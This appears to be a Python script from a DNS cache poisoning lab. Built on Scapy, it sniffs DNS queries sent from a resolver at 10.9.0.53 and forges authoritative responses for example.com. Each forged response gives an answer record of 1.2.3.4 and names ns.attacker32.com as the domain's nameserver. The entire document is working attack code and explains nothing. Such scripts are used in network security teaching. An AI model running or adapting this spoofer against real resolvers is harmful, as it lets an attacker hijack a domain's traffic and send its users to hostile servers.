# spoof DNS response

from scapy.all import * 

domain = 'example.com'
ns = 'ns.attacker32.com'
name = '_.example.com'

def spoof_dns(pkt):
    if (DNS in pkt and 'example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        pkt.show()
        Qdsec = DNSQR(qname=name)
        Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
        NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)

        dns = DNS(id=pkt[DNS].id, aa=1, rd=0, qr=1, # fake to guest correct ID
        qdcount=1, ancount=1, nscount=1, arcount=0,
        qd=Qdsec, an=Anssec, ns=NSsec)

        ip = IP(dst='10.9.0.53', src='10.9.0.153') 
        udp = UDP(dport=33333, sport=53, chksum=0)
        reply = ip/udp/dns

        send(reply)

f = 'udp and dst port 53 and src host 10.9.0.53'
sniff(iface='br-aba6155d7b33', filter=f, prn=spoof_dns)